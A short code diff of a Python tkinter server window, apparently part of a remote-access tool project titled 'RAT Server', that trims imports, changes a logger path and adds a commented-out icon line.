@@ -4,9 +4,8 @@ Server GUI implementation.
 
 import tkinter as tk
 from tkinter import ttk, scrolledtext, messagebox
-from typing import Optional, Callable, Dict, Tuple
-from utils.constants import SERVER_WINDOW_SIZE, SERVER_TITLE
-from utils.logger import Logger, ChatLogger
+from typing import Dict, Tuple
+from src.utils.logger import Logger
 from datetime import datetime
 import base64
 from PIL import Image, ImageTk
@@ -25,7 +24,8 @@ class ServerGUI:
         """
         self.root = root
         self.server = server  # Store server reference
-        
+
+        # self.root.iconbitmap("chilli.ico")
         self.root.title("RAT Server")
         self.root.geometry("1200x700")  # Augmenté pour accommoder le nouveau panneau
         
